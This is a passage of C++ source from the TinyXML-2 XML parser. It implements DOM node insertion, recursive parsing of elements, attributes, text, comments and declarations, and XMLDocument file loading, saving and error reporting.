}


XMLNode* XMLNode::InsertEndChild( XMLNode* addThis )
{
    TIXMLASSERT( addThis );
    if ( addThis->_document != _document ) {
        TIXMLASSERT( false );
        return 0;
    }
    InsertChildPreamble( addThis );

    if ( _lastChild ) {
        TIXMLASSERT( _firstChild );
        TIXMLASSERT( _lastChild->_next == 0 );
        _lastChild->_next = addThis;
        addThis->_prev = _lastChild;
        _lastChild = addThis;

        addThis->_next = 0;
    }
    else {
        TIXMLASSERT( _firstChild == 0 );
        _firstChild = _lastChild = addThis;

        addThis->_prev = 0;
        addThis->_next = 0;
    }
    addThis->_parent = this;
    return addThis;
}


XMLNode* XMLNode::InsertFirstChild( XMLNode* addThis )
{
    TIXMLASSERT( addThis );
    if ( addThis->_document != _document ) {
        TIXMLASSERT( false );
        return 0;
    }
    InsertChildPreamble( addThis );

    if ( _firstChild ) {
        TIXMLASSERT( _lastChild );
        TIXMLASSERT( _firstChild->_prev == 0 );

        _firstChild->_prev = addThis;
        addThis->_next = _firstChild;
        _firstChild = addThis;

        addThis->_prev = 0;
    }
    else {
        TIXMLASSERT( _lastChild == 0 );
        _firstChild = _lastChild = addThis;

        addThis->_prev = 0;
        addThis->_next = 0;
    }
    addThis->_parent = this;
    return addThis;
}


XMLNode* XMLNode::InsertAfterChild( XMLNode* afterThis, XMLNode* addThis )
{
    TIXMLASSERT( addThis );
    if ( addThis->_document != _document ) {
        TIXMLASSERT( false );
        return 0;
    }

    TIXMLASSERT( afterThis );

    if ( afterThis->_parent != this ) {
        TIXMLASSERT( false );
        return 0;
    }

    if ( afterThis->_next == 0 ) {
        // The last node or the only node.
        return InsertEndChild( addThis );
    }
    InsertChildPreamble( addThis );
    addThis->_prev = afterThis;
    addThis->_next = afterThis->_next;
    afterThis->_next->_prev = addThis;
    afterThis->_next = addThis;
    addThis->_parent = this;
    return addThis;
}




const XMLElement* XMLNode::FirstChildElement( const char* value ) const
{
    for( const XMLNode* node = _firstChild; node; node = node->_next ) {
        const XMLElement* element = node->ToElement();
        if ( element ) {
            if ( !value || XMLUtil::StringEqual( element->Name(), value ) ) {
                return element;
            }
        }
    }
    return 0;
}


const XMLElement* XMLNode::LastChildElement( const char* value ) const
{
    for( const XMLNode* node = _lastChild; node; node = node->_prev ) {
        const XMLElement* element = node->ToElement();
        if ( element ) {
            if ( !value || XMLUtil::StringEqual( element->Name(), value ) ) {
                return element;
            }
        }
    }
    return 0;
}


const XMLElement* XMLNode::NextSiblingElement( const char* value ) const
{
    for( const XMLNode* node = _next; node; node = node->_next ) {
        const XMLElement* element = node->ToElement();
        if ( element
                && (!value || XMLUtil::StringEqual( value, node->Value() ))) {
            return element;
        }
    }
    return 0;
}


const XMLElement* XMLNode::PreviousSiblingElement( const char* value ) const
{
    for( const XMLNode* node = _prev; node; node = node->_prev ) {
        const XMLElement* element = node->ToElement();
        if ( element
                && (!value || XMLUtil::StringEqual( value, node->Value() ))) {
            return element;
        }
    }
    return 0;
}


char* XMLNode::ParseDeep( char* p, StrPair* parentEnd )
{
    // This is a recursive method, but thinking about it "at the current level"
    // it is a pretty simple flat list:
    //		<foo/>
    //		<!-- comment -->
    //
    // With a special case:
    //		<foo>
    //		</foo>
    //		<!-- comment -->
    //
    // Where the closing element (/foo) *must* be the next thing after the opening
    // element, and the names must match. BUT the tricky bit is that the closing
    // element will be read by the child.
    //
    // 'endTag' is the end tag for this node, it is returned by a call to a child.
    // 'parentEnd' is the end tag for the parent, which is filled in and returned.

    while( p && *p ) {
        XMLNode* node = 0;

        p = _document->Identify( p, &node );
        if ( node == 0 ) {
            break;
        }

        StrPair endTag;
        p = node->ParseDeep( p, &endTag );
        if ( !p ) {
            DeleteNode( node );
            if ( !_document->Error() ) {
                _document->SetError( XML_ERROR_PARSING, 0, 0 );
            }
            break;
        }

        XMLElement* ele = node->ToElement();
        if ( ele ) {
            // We read the end tag. Return it to the parent.
            if ( ele->ClosingType() == XMLElement::CLOSING ) {
                if ( parentEnd ) {
                    ele->_value.TransferTo( parentEnd );
                }
                node->_memPool->SetTracked();   // created and then immediately deleted.
                DeleteNode( node );
                return p;
            }

            // Handle an end tag returned to this level.
            // And handle a bunch of annoying errors.
            bool mismatch = false;
            if ( endTag.Empty() ) {
                if ( ele->ClosingType() == XMLElement::OPEN ) {
                    mismatch = true;
                }
            }
            else {
                if ( ele->ClosingType() != XMLElement::OPEN ) {
                    mismatch = true;
                }
                else if ( !XMLUtil::StringEqual( endTag.GetStr(), node->Value() ) ) {
                    mismatch = true;
                }
            }
            if ( mismatch ) {
                _document->SetError( XML_ERROR_MISMATCHED_ELEMENT, node->Value(), 0 );
                DeleteNode( node );
                break;
            }
        }
        InsertEndChild( node );
    }
    return 0;
}

void XMLNode::DeleteNode( XMLNode* node )
{
    if ( node == 0 ) {
        return;
    }
    MemPool* pool = node->_memPool;
    node->~XMLNode();
    pool->Free( node );
}

void XMLNode::InsertChildPreamble( XMLNode* insertThis ) const
{
    TIXMLASSERT( insertThis );
    TIXMLASSERT( insertThis->_document == _document );

    if ( insertThis->_parent )
        insertThis->_parent->Unlink( insertThis );
    else
        insertThis->_memPool->SetTracked();
}

// --------- XMLText ---------- //
char* XMLText::ParseDeep( char* p, StrPair* )
{
    const char* start = p;
    if ( this->CData() ) {
        p = _value.ParseText( p, "]]>", StrPair::NEEDS_NEWLINE_NORMALIZATION );
        if ( !p ) {
            _document->SetError( XML_ERROR_PARSING_CDATA, start, 0 );
        }
        return p;
    }
    else {
        int flags = _document->ProcessEntities() ? StrPair::TEXT_ELEMENT : StrPair::TEXT_ELEMENT_LEAVE_ENTITIES;
        if ( _document->WhitespaceMode() == COLLAPSE_WHITESPACE ) {
            flags |= StrPair::COLLAPSE_WHITESPACE;
        }

        p = _value.ParseText( p, "<", flags );
        if ( p && *p ) {
            return p-1;
        }
        if ( !p ) {
            _document->SetError( XML_ERROR_PARSING_TEXT, start, 0 );
        }
    }
    return 0;
}


XMLNode* XMLText::ShallowClone( XMLDocument* doc ) const
{
    if ( !doc ) {
        doc = _document;
    }
    XMLText* text = doc->NewText( Value() );	// fixme: this will always allocate memory. Intern?
    text->SetCData( this->CData() );
    return text;
}


bool XMLText::ShallowEqual( const XMLNode* compare ) const
{
    const XMLText* text = compare->ToText();
    return ( text && XMLUtil::StringEqual( text->Value(), Value() ) );
}


bool XMLText::Accept( XMLVisitor* visitor ) const
{
    TIXMLASSERT( visitor );
    return visitor->Visit( *this );
}


// --------- XMLComment ---------- //

XMLComment::XMLComment( XMLDocument* doc ) : XMLNode( doc )
{
}


XMLComment::~XMLComment()
{
}


char* XMLComment::ParseDeep( char* p, StrPair* )
{
    // Comment parses as text.
    const char* start = p;
    p = _value.ParseText( p, "-->", StrPair::COMMENT );
    if ( p == 0 ) {
        _document->SetError( XML_ERROR_PARSING_COMMENT, start, 0 );
    }
    return p;
}


XMLNode* XMLComment::ShallowClone( XMLDocument* doc ) const
{
    if ( !doc ) {
        doc = _document;
    }
    XMLComment* comment = doc->NewComment( Value() );	// fixme: this will always allocate memory. Intern?
    return comment;
}


bool XMLComment::ShallowEqual( const XMLNode* compare ) const
{
    TIXMLASSERT( compare );
    const XMLComment* comment = compare->ToComment();
    return ( comment && XMLUtil::StringEqual( comment->Value(), Value() ));
}


bool XMLComment::Accept( XMLVisitor* visitor ) const
{
    TIXMLASSERT( visitor );
    return visitor->Visit( *this );
}


// --------- XMLDeclaration ---------- //

XMLDeclaration::XMLDeclaration( XMLDocument* doc ) : XMLNode( doc )
{
}


XMLDeclaration::~XMLDeclaration()
{
    //printf( "~XMLDeclaration\n" );
}


char* XMLDeclaration::ParseDeep( char* p, StrPair* )
{
    // Declaration parses as text.
    const char* start = p;
    p = _value.ParseText( p, "?>", StrPair::NEEDS_NEWLINE_NORMALIZATION );
    if ( p == 0 ) {
        _document->SetError( XML_ERROR_PARSING_DECLARATION, start, 0 );
    }
    return p;
}


XMLNode* XMLDeclaration::ShallowClone( XMLDocument* doc ) const
{
    if ( !doc ) {
        doc = _document;
    }
    XMLDeclaration* dec = doc->NewDeclaration( Value() );	// fixme: this will always allocate memory. Intern?
    return dec;
}


bool XMLDeclaration::ShallowEqual( const XMLNode* compare ) const
{
    TIXMLASSERT( compare );
    const XMLDeclaration* declaration = compare->ToDeclaration();
    return ( declaration && XMLUtil::StringEqual( declaration->Value(), Value() ));
}



bool XMLDeclaration::Accept( XMLVisitor* visitor ) const
{
    TIXMLASSERT( visitor );
    return visitor->Visit( *this );
}

// --------- XMLUnknown ---------- //

XMLUnknown::XMLUnknown( XMLDocument* doc ) : XMLNode( doc )
{
}


XMLUnknown::~XMLUnknown()
{
}


char* XMLUnknown::ParseDeep( char* p, StrPair* )
{
    // Unknown parses as text.
    const char* start = p;

    p = _value.ParseText( p, ">", StrPair::NEEDS_NEWLINE_NORMALIZATION );
    if ( !p ) {
        _document->SetError( XML_ERROR_PARSING_UNKNOWN, start, 0 );
    }
    return p;
}


XMLNode* XMLUnknown::ShallowClone( XMLDocument* doc ) const
{
    if ( !doc ) {
        doc = _document;
    }
    XMLUnknown* text = doc->NewUnknown( Value() );	// fixme: this will always allocate memory. Intern?
    return text;
}


bool XMLUnknown::ShallowEqual( const XMLNode* compare ) const
{
    TIXMLASSERT( compare );
    const XMLUnknown* unknown = compare->ToUnknown();
    return ( unknown && XMLUtil::StringEqual( unknown->Value(), Value() ));
}


bool XMLUnknown::Accept( XMLVisitor* visitor ) const
{
    TIXMLASSERT( visitor );
    return visitor->Visit( *this );
}

// --------- XMLAttribute ---------- //

const char* XMLAttribute::Name() const 
{
    return _name.GetStr();
}

const char* XMLAttribute::Value() const 
{
    return _value.GetStr();
}

char* XMLAttribute::ParseDeep( char* p, bool processEntities )
{
    // Parse using the name rules: bug fix, was using ParseText before
    p = _name.ParseName( p );
    if ( !p || !*p ) {
        return 0;
    }

    // Skip white space before =
    p = XMLUtil::SkipWhiteSpace( p );
    if ( *p != '=' ) {
        return 0;
    }

    ++p;	// move up to opening quote
    p = XMLUtil::SkipWhiteSpace( p );
    if ( *p != '\"' && *p != '\'' ) {
        return 0;
    }

    char endTag[2] = { *p, 0 };
    ++p;	// move past opening quote

    p = _value.ParseText( p, endTag, processEntities ? StrPair::ATTRIBUTE_VALUE : StrPair::ATTRIBUTE_VALUE_LEAVE_ENTITIES );
    return p;
}


void XMLAttribute::SetName( const char* n )
{
    _name.SetStr( n );
}


XMLError XMLAttribute::QueryIntValue( int* value ) const
{
    if ( XMLUtil::ToInt( Value(), value )) {
        return XML_NO_ERROR;
    }
    return XML_WRONG_ATTRIBUTE_TYPE;
}


XMLError XMLAttribute::QueryUnsignedValue( unsigned int* value ) const
{
    if ( XMLUtil::ToUnsigned( Value(), value )) {
        return XML_NO_ERROR;
    }
    return XML_WRONG_ATTRIBUTE_TYPE;
}


XMLError XMLAttribute::QueryBoolValue( bool* value ) const
{
    if ( XMLUtil::ToBool( Value(), value )) {
        return XML_NO_ERROR;
    }
    return XML_WRONG_ATTRIBUTE_TYPE;
}


XMLError XMLAttribute::QueryFloatValue( float* value ) const
{
    if ( XMLUtil::ToFloat( Value(), value )) {
        return XML_NO_ERROR;
    }
    return XML_WRONG_ATTRIBUTE_TYPE;
}


XMLError XMLAttribute::QueryDoubleValue( double* value ) const
{
    if ( XMLUtil::ToDouble( Value(), value )) {
        return XML_NO_ERROR;
    }
    return XML_WRONG_ATTRIBUTE_TYPE;
}


void XMLAttribute::SetAttribute( const char* v )
{
    _value.SetStr( v );
}


void XMLAttribute::SetAttribute( int v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    _value.SetStr( buf );
}


void XMLAttribute::SetAttribute( unsigned v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    _value.SetStr( buf );
}


void XMLAttribute::SetAttribute( bool v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    _value.SetStr( buf );
}

void XMLAttribute::SetAttribute( double v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    _value.SetStr( buf );
}

void XMLAttribute::SetAttribute( float v )
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    _value.SetStr( buf );
}


// --------- XMLElement ---------- //
XMLElement::XMLElement( XMLDocument* doc ) : XMLNode( doc ),
    _closingType( 0 ),
    _rootAttribute( 0 )
{
}


XMLElement::~XMLElement()
{
    while( _rootAttribute ) {
        XMLAttribute* next = _rootAttribute->_next;
        DeleteAttribute( _rootAttribute );
        _rootAttribute = next;
    }
}


const XMLAttribute* XMLElement::FindAttribute( const char* name ) const
{
    for( XMLAttribute* a = _rootAttribute; a; a = a->_next ) {
        if ( XMLUtil::StringEqual( a->Name(), name ) ) {
            return a;
        }
    }
    return 0;
}


const char* XMLElement::Attribute( const char* name, const char* value ) const
{
    const XMLAttribute* a = FindAttribute( name );
    if ( !a ) {
        return 0;
    }
    if ( !value || XMLUtil::StringEqual( a->Value(), value )) {
        return a->Value();
    }
    return 0;
}


const char* XMLElement::GetText() const
{
    if ( FirstChild() && FirstChild()->ToText() ) {
        return FirstChild()->Value();
    }
    return 0;
}


void	XMLElement::SetText( const char* inText )
{
	if ( FirstChild() && FirstChild()->ToText() )
		FirstChild()->SetValue( inText );
	else {
		XMLText*	theText = GetDocument()->NewText( inText );
		InsertFirstChild( theText );
	}
}


void XMLElement::SetText( int v ) 
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    SetText( buf );
}


void XMLElement::SetText( unsigned v ) 
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    SetText( buf );
}


void XMLElement::SetText( bool v ) 
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    SetText( buf );
}


void XMLElement::SetText( float v ) 
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    SetText( buf );
}


void XMLElement::SetText( double v ) 
{
    char buf[BUF_SIZE];
    XMLUtil::ToStr( v, buf, BUF_SIZE );
    SetText( buf );
}


XMLError XMLElement::QueryIntText( int* ival ) const
{
    if ( FirstChild() && FirstChild()->ToText() ) {
        const char* t = FirstChild()->Value();
        if ( XMLUtil::ToInt( t, ival ) ) {
            return XML_SUCCESS;
        }
        return XML_CAN_NOT_CONVERT_TEXT;
    }
    return XML_NO_TEXT_NODE;
}


XMLError XMLElement::QueryUnsignedText( unsigned* uval ) const
{
    if ( FirstChild() && FirstChild()->ToText() ) {
        const char* t = FirstChild()->Value();
        if ( XMLUtil::ToUnsigned( t, uval ) ) {
            return XML_SUCCESS;
        }
        return XML_CAN_NOT_CONVERT_TEXT;
    }
    return XML_NO_TEXT_NODE;
}


XMLError XMLElement::QueryBoolText( bool* bval ) const
{
    if ( FirstChild() && FirstChild()->ToText() ) {
        const char* t = FirstChild()->Value();
        if ( XMLUtil::ToBool( t, bval ) ) {
            return XML_SUCCESS;
        }
        return XML_CAN_NOT_CONVERT_TEXT;
    }
    return XML_NO_TEXT_NODE;
}


XMLError XMLElement::QueryDoubleText( double* dval ) const
{
    if ( FirstChild() && FirstChild()->ToText() ) {
        const char* t = FirstChild()->Value();
        if ( XMLUtil::ToDouble( t, dval ) ) {
            return XML_SUCCESS;
        }
        return XML_CAN_NOT_CONVERT_TEXT;
    }
    return XML_NO_TEXT_NODE;
}


XMLError XMLElement::QueryFloatText( float* fval ) const
{
    if ( FirstChild() && FirstChild()->ToText() ) {
        const char* t = FirstChild()->Value();
        if ( XMLUtil::ToFloat( t, fval ) ) {
            return XML_SUCCESS;
        }
        return XML_CAN_NOT_CONVERT_TEXT;
    }
    return XML_NO_TEXT_NODE;
}



XMLAttribute* XMLElement::FindOrCreateAttribute( const char* name )
{
    XMLAttribute* last = 0;
    XMLAttribute* attrib = 0;
    for( attrib = _rootAttribute;
            attrib;
            last = attrib, attrib = attrib->_next ) {
        if ( XMLUtil::StringEqual( attrib->Name(), name ) ) {
            break;
        }
    }
    if ( !attrib ) {
        TIXMLASSERT( sizeof( XMLAttribute ) == _document->_attributePool.ItemSize() );
        attrib = new (_document->_attributePool.Alloc() ) XMLAttribute();
        attrib->_memPool = &_document->_attributePool;
        if ( last ) {
            last->_next = attrib;
        }
        else {
            _rootAttribute = attrib;
        }
        attrib->SetName( name );
        attrib->_memPool->SetTracked(); // always created and linked.
    }
    return attrib;
}


void XMLElement::DeleteAttribute( const char* name )
{
    XMLAttribute* prev = 0;
    for( XMLAttribute* a=_rootAttribute; a; a=a->_next ) {
        if ( XMLUtil::StringEqual( name, a->Name() ) ) {
            if ( prev ) {
                prev->_next = a->_next;
            }
            else {
                _rootAttribute = a->_next;
            }
            DeleteAttribute( a );
            break;
        }
        prev = a;
    }
}


char* XMLElement::ParseAttributes( char* p )
{
    const char* start = p;
    XMLAttribute* prevAttribute = 0;

    // Read the attributes.
    while( p ) {
        p = XMLUtil::SkipWhiteSpace( p );
        if ( !(*p) ) {
            _document->SetError( XML_ERROR_PARSING_ELEMENT, start, Name() );
            return 0;
        }

        // attribute.
        if (XMLUtil::IsNameStartChar( *p ) ) {
            TIXMLASSERT( sizeof( XMLAttribute ) == _document->_attributePool.ItemSize() );
            XMLAttribute* attrib = new (_document->_attributePool.Alloc() ) XMLAttribute();
            attrib->_memPool = &_document->_attributePool;
			attrib->_memPool->SetTracked();

            p = attrib->ParseDeep( p, _document->ProcessEntities() );
            if ( !p || Attribute( attrib->Name() ) ) {
                DeleteAttribute( attrib );
                _document->SetError( XML_ERROR_PARSING_ATTRIBUTE, start, p );
                return 0;
            }
            // There is a minor bug here: if the attribute in the source xml
            // document is duplicated, it will not be detected and the
            // attribute will be doubly added. However, tracking the 'prevAttribute'
            // avoids re-scanning the attribute list. Preferring performance for
            // now, may reconsider in the future.
            if ( prevAttribute ) {
                prevAttribute->_next = attrib;
            }
            else {
                _rootAttribute = attrib;
            }
            prevAttribute = attrib;
        }
        // end of the tag
        else if ( *p == '>' ) {
            ++p;
            break;
        }
        // end of the tag
        else if ( *p == '/' && *(p+1) == '>' ) {
            _closingType = CLOSED;
            return p+2;	// done; sealed element.
        }
        else {
            _document->SetError( XML_ERROR_PARSING_ELEMENT, start, p );
            return 0;
        }
    }
    return p;
}

void XMLElement::DeleteAttribute( XMLAttribute* attribute )
{
    if ( attribute == 0 ) {
        return;
    }
    MemPool* pool = attribute->_memPool;
    attribute->~XMLAttribute();
    pool->Free( attribute );
}

//
//	<ele></ele>
//	<ele>foo<b>bar</b></ele>
//
char* XMLElement::ParseDeep( char* p, StrPair* strPair )
{
    // Read the element name.
    p = XMLUtil::SkipWhiteSpace( p );

    // The closing element is the </element> form. It is
    // parsed just like a regular element then deleted from
    // the DOM.
    if ( *p == '/' ) {
        _closingType = CLOSING;
        ++p;
    }

    p = _value.ParseName( p );
    if ( _value.Empty() ) {
        return 0;
    }

    p = ParseAttributes( p );
    if ( !p || !*p || _closingType ) {
        return p;
    }

    p = XMLNode::ParseDeep( p, strPair );
    return p;
}



XMLNode* XMLElement::ShallowClone( XMLDocument* doc ) const
{
    if ( !doc ) {
        doc = _document;
    }
    XMLElement* element = doc->NewElement( Value() );					// fixme: this will always allocate memory. Intern?
    for( const XMLAttribute* a=FirstAttribute(); a; a=a->Next() ) {
        element->SetAttribute( a->Name(), a->Value() );					// fixme: this will always allocate memory. Intern?
    }
    return element;
}


bool XMLElement::ShallowEqual( const XMLNode* compare ) const
{
    TIXMLASSERT( compare );
    const XMLElement* other = compare->ToElement();
    if ( other && XMLUtil::StringEqual( other->Value(), Value() )) {

        const XMLAttribute* a=FirstAttribute();
        const XMLAttribute* b=other->FirstAttribute();

        while ( a && b ) {
            if ( !XMLUtil::StringEqual( a->Value(), b->Value() ) ) {
                return false;
            }
            a = a->Next();
            b = b->Next();
        }
        if ( a || b ) {
            // different count
            return false;
        }
        return true;
    }
    return false;
}


bool XMLElement::Accept( XMLVisitor* visitor ) const
{
    TIXMLASSERT( visitor );
    if ( visitor->VisitEnter( *this, _rootAttribute ) ) {
        for ( const XMLNode* node=FirstChild(); node; node=node->NextSibling() ) {
            if ( !node->Accept( visitor ) ) {
                break;
            }
        }
    }
    return visitor->VisitExit( *this );
}


// --------- XMLDocument ----------- //

// Warning: List must match 'enum XMLError'
const char* XMLDocument::_errorNames[XML_ERROR_COUNT] = {
    "XML_SUCCESS",
    "XML_NO_ATTRIBUTE",
    "XML_WRONG_ATTRIBUTE_TYPE",
    "XML_ERROR_FILE_NOT_FOUND",
    "XML_ERROR_FILE_COULD_NOT_BE_OPENED",
    "XML_ERROR_FILE_READ_ERROR",
    "XML_ERROR_ELEMENT_MISMATCH",
    "XML_ERROR_PARSING_ELEMENT",
    "XML_ERROR_PARSING_ATTRIBUTE",
    "XML_ERROR_IDENTIFYING_TAG",
    "XML_ERROR_PARSING_TEXT",
    "XML_ERROR_PARSING_CDATA",
    "XML_ERROR_PARSING_COMMENT",
    "XML_ERROR_PARSING_DECLARATION",
    "XML_ERROR_PARSING_UNKNOWN",
    "XML_ERROR_EMPTY_DOCUMENT",
    "XML_ERROR_MISMATCHED_ELEMENT",
    "XML_ERROR_PARSING",
    "XML_CAN_NOT_CONVERT_TEXT",
    "XML_NO_TEXT_NODE"
};


XMLDocument::XMLDocument( bool processEntities, Whitespace whitespace ) :
    XMLNode( 0 ),
    _writeBOM( false ),
    _processEntities( processEntities ),
    _errorID( XML_NO_ERROR ),
    _whitespace( whitespace ),
    _errorStr1( 0 ),
    _errorStr2( 0 ),
    _charBuffer( 0 )
{
    _document = this;	// avoid warning about 'this' in initializer list
}


XMLDocument::~XMLDocument()
{
    Clear();
}


void XMLDocument::Clear()
{
    DeleteChildren();

#ifdef DEBUG
    const bool hadError = Error();
#endif
    _errorID = XML_NO_ERROR;
    _errorStr1 = 0;
    _errorStr2 = 0;

    delete [] _charBuffer;
    _charBuffer = 0;

#if 0
    _textPool.Trace( "text" );
    _elementPool.Trace( "element" );
    _commentPool.Trace( "comment" );
    _attributePool.Trace( "attribute" );
#endif
    
#ifdef DEBUG
    if ( !hadError ) {
        TIXMLASSERT( _elementPool.CurrentAllocs()   == _elementPool.Untracked() );
        TIXMLASSERT( _attributePool.CurrentAllocs() == _attributePool.Untracked() );
        TIXMLASSERT( _textPool.CurrentAllocs()      == _textPool.Untracked() );
        TIXMLASSERT( _commentPool.CurrentAllocs()   == _commentPool.Untracked() );
    }
#endif
}


XMLElement* XMLDocument::NewElement( const char* name )
{
    TIXMLASSERT( sizeof( XMLElement ) == _elementPool.ItemSize() );
    XMLElement* ele = new (_elementPool.Alloc()) XMLElement( this );
    ele->_memPool = &_elementPool;
    ele->SetName( name );
    return ele;
}


XMLComment* XMLDocument::NewComment( const char* str )
{
    TIXMLASSERT( sizeof( XMLComment ) == _commentPool.ItemSize() );
    XMLComment* comment = new (_commentPool.Alloc()) XMLComment( this );
    comment->_memPool = &_commentPool;
    comment->SetValue( str );
    return comment;
}


XMLText* XMLDocument::NewText( const char* str )
{
    TIXMLASSERT( sizeof( XMLText ) == _textPool.ItemSize() );
    XMLText* text = new (_textPool.Alloc()) XMLText( this );
    text->_memPool = &_textPool;
    text->SetValue( str );
    return text;
}


XMLDeclaration* XMLDocument::NewDeclaration( const char* str )
{
    TIXMLASSERT( sizeof( XMLDeclaration ) == _commentPool.ItemSize() );
    XMLDeclaration* dec = new (_commentPool.Alloc()) XMLDeclaration( this );
    dec->_memPool = &_commentPool;
    dec->SetValue( str ? str : "xml version=\"1.0\" encoding=\"UTF-8\"" );
    return dec;
}


XMLUnknown* XMLDocument::NewUnknown( const char* str )
{
    TIXMLASSERT( sizeof( XMLUnknown ) == _commentPool.ItemSize() );
    XMLUnknown* unk = new (_commentPool.Alloc()) XMLUnknown( this );
    unk->_memPool = &_commentPool;
    unk->SetValue( str );
    return unk;
}

static FILE* callfopen( const char* filepath, const char* mode )
{
    TIXMLASSERT( filepath );
    TIXMLASSERT( mode );
#if defined(_MSC_VER) && (_MSC_VER >= 1400 ) && (!defined WINCE)
    FILE* fp = 0;
    errno_t err = fopen_s( &fp, filepath, mode );
    if ( err ) {
        return 0;
    }
#else
    FILE* fp = fopen( filepath, mode );
#endif
    return fp;
}
    
void XMLDocument::DeleteNode( XMLNode* node )	{
    TIXMLASSERT( node );
    TIXMLASSERT(node->_document == this );
    if (node->_parent) {
        node->_parent->DeleteChild( node );
    }
    else {
        // Isn't in the tree.
        // Use the parent delete.
        // Also, we need to mark it tracked: we 'know'
        // it was never used.
        node->_memPool->SetTracked();
        // Call the static XMLNode version:
        XMLNode::DeleteNode(node);
    }
}


XMLError XMLDocument::LoadFile( const char* filename )
{
    Clear();
    FILE* fp = callfopen( filename, "rb" );
    if ( !fp ) {
        SetError( XML_ERROR_FILE_NOT_FOUND, filename, 0 );
        return _errorID;
    }
    LoadFile( fp );
    fclose( fp );
    return _errorID;
}


XMLError XMLDocument::LoadFile( FILE* fp )
{
    Clear();

    fseek( fp, 0, SEEK_SET );
    if ( fgetc( fp ) == EOF && ferror( fp ) != 0 ) {
        SetError( XML_ERROR_FILE_READ_ERROR, 0, 0 );
        return _errorID;
    }

    fseek( fp, 0, SEEK_END );
    const long filelength = ftell( fp );
    fseek( fp, 0, SEEK_SET );
    if ( filelength == -1L ) {
        SetError( XML_ERROR_FILE_READ_ERROR, 0, 0 );
        return _errorID;
    }

    const size_t size = filelength;
    if ( size == 0 ) {
        SetError( XML_ERROR_EMPTY_DOCUMENT, 0, 0 );
        return _errorID;
    }

    _charBuffer = new char[size+1];
    size_t read = fread( _charBuffer, 1, size, fp );
    if ( read != size ) {
        SetError( XML_ERROR_FILE_READ_ERROR, 0, 0 );
        return _errorID;
    }

    _charBuffer[size] = 0;

    Parse();
    return _errorID;
}


XMLError XMLDocument::SaveFile( const char* filename, bool compact )
{
    FILE* fp = callfopen( filename, "w" );
    if ( !fp ) {
        SetError( XML_ERROR_FILE_COULD_NOT_BE_OPENED, filename, 0 );
        return _errorID;
    }
    SaveFile(fp, compact);
    fclose( fp );
    return _errorID;
}


XMLError XMLDocument::SaveFile( FILE* fp, bool compact )
{
    // Clear any error from the last save, otherwise it will get reported
    // for *this* call.
    SetError( XML_NO_ERROR, 0, 0 );
    XMLPrinter stream( fp, compact );
    Print( &stream );
    return _errorID;
}


XMLError XMLDocument::Parse( const char* p, size_t len )
{
    Clear();

    if ( len == 0 || !p || !*p ) {
        SetError( XML_ERROR_EMPTY_DOCUMENT, 0, 0 );
        return _errorID;
    }
    if ( len == (size_t)(-1) ) {
        len = strlen( p );
    }
    _charBuffer = new char[ len+1 ];
    memcpy( _charBuffer, p, len );
    _charBuffer[len] = 0;

    Parse();
    if ( Error() ) {
        // clean up now essentially dangling memory.
        // and the parse fail can put objects in the
        // pools that are dead and inaccessible.
        DeleteChildren();
        _elementPool.Clear();
        _attributePool.Clear();
        _textPool.Clear();
        _commentPool.Clear();
    }
    return _errorID;
}


void XMLDocument::Print( XMLPrinter* streamer ) const
{
    XMLPrinter stdStreamer( stdout );
    if ( !streamer ) {
        streamer = &stdStreamer;
    }
    Accept( streamer );
}


void XMLDocument::SetError( XMLError error, const char* str1, const char* str2 )
{
    TIXMLASSERT( error >= 0 && error < XML_ERROR_COUNT );
    _errorID = error;
    _errorStr1 = str1;
    _errorStr2 = str2;
}

const char* XMLDocument::ErrorName() const
{
	TIXMLASSERT( _errorID >= 0 && _errorID < XML_ERROR_COUNT );
	return _errorNames[_errorID];
}

void XMLDocument::PrintError() const
{
    if ( Error() ) {
        static const int LEN = 20;
        char buf1[LEN] = { 0 };
        char buf2[LEN] = { 0 };

        if ( _errorStr1 ) {
            TIXML_SNPRINTF( buf1, LEN, "%s", _errorStr1 );
        }
        if ( _errorStr2 ) {
            TIXML_SNPRINTF( buf2, LEN, "%s", _errorStr2 );
        }

        // Should check INT_MIN <= _errorID && _errorId <= INT_MAX, but that
        // causes a clang "always true" -Wtautological-constant-out-of-range-compare warning
        TIXMLASSERT( 0 <= _errorID && XML_ERROR_COUNT - 1 <= INT_MAX );
        printf( "XMLDocument error id=%d '%s' str1=%s str2=%s\n",
                static_cast<int>( _errorID ), ErrorName(), buf1, buf2 );
    }
}

void XMLDocument::Parse()
{
    TIXMLASSERT( NoChildren() ); // Clear() must have been called previously
    TIXMLASSERT( _charBuffer );
    char* p = _charBuffer;
    p = XMLUtil::SkipWhiteSpace( p );
    p = const_cast<char*>( XMLUtil::ReadBOM( p, &_writeBOM ) );
    if ( !*p ) {
        SetError( XML_ERROR_EMPTY_DOCUMENT, 0, 0 );
        return;
    }
    ParseDeep(p, 0 );
}

XMLPrinter::XMLPrinter( FILE* file, bool compact, int depth ) :
    _elementJustOpened( false ),
    _firstElement( true ),
    _fp( file ),
    _depth( depth ),
    _textDepth( -1 ),
    _processEntities( true ),
    _compactMode( compact )
{
    for( int i=0; i<ENTITY_RANGE; ++i ) {
        _entityFlag[i] = false;
        _restrictedEntityFlag[i] = false;
    }
    for( int i=0; i<NUM_ENTITIES; ++i ) {
        const char entityValue = entities[i].value;
        TIXMLASSERT( 0 <= entityValue && entityValue < ENTITY_RANGE );
        _entityFlag[ (unsigned char)entityValue ] = true;
    }
    _restrictedEntityFlag[(unsigned char)'&'] = true;
    _restrictedEntityFlag[(unsigned char)'<'] = true;
    _restrictedEntityFlag[(unsigned char)'>'] = true;	// not required, but consistency is nice
    _buffer.Push( 0 );
}


void XMLPrinter::Print( const char* format, ... )
{
    va_list     va;
    va_start( va, format );

    if ( _fp ) {
        vfprintf( _fp, format, va );
    }
    else {
#if defined(_MSC_VER) && (_MSC_VER >= 1400 )
		#if defined(WINCE)
		int len = 512;
		do {
